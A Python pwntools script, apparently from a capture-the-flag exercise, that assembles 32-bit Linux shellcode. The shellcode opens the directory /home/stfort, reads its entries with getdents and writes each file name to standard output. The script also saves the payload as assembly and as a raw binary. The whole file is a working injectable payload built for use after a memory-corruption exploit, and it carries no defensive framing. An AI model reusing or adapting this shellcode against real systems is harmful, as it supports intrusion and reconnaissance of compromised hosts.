from pwn import *

context.os = "linux"
context.arch = "i386"

DIR = "/home/stfort"
BUFMAX = 1024

'''
STRUCTURE OF linux_dirent
| Offset     | Name     | Type   | Size               |
| ---------- | -------- | ------ | ------------------ |
| 0          | d_ino    | long   | 4                  |
| 4          | d_off    | long   | 4                  |
| 8          | d_reclen | short  | 2                  |
| 10         | d_name   | char[] | d_reclen-(4+4+2+1) |
| d_reclen-1 | d_type   | char   | 1                  |
'''

sh = f"""
{shellcraft.pushstr(DIR)}
{shellcraft.syscall('SYS_open', 'esp', os.O_DIRECTORY | os.O_NONBLOCK | os.O_CLOEXEC | os.O_RDONLY )}
mov esi, eax
sub esp, {BUFMAX}
{shellcraft.syscall('SYS_getdents', 'esi', 'esp', BUFMAX)}
mov esi, eax /* esi := size */
mov edi, esp
add edi, esi /* edi := iteration_end */
mov esi, esp /* esi := iteration_start */
jmp check
_loop:
add esi, 8 /* skip d_ino and d_off */
movzx edx, word ptr [esi] /* edz := d_reclen */
sub edx, 11 /* subtract sizeof(d_ino) + sizeof(d_off) + sizeof(d_reclen) + sizeof(d_type)*/
add esi, 2 /* skip d_reclen */ 
{shellcraft.syscall('SYS_write', 1, 'esi', 'edx')}
add esi, edx /* fixup pointer */
inc esi
check:
cmp edi, esi
jg _loop

"""

shellcode = asm(sh)

if __name__ == "__main__":
    print(sh)
    with open("getdents.asm", "wt") as f:
        f.write("""
BITS 32
SYS_open equ 5
SYS_write equ 4
SYS_getdents equ 141
""")
        f.write(sh.replace("/*", ";").replace("*/", "").replace("ptr ", ""))
    with open("getdents.bin", "wb") as f:
        f.write(shellcode)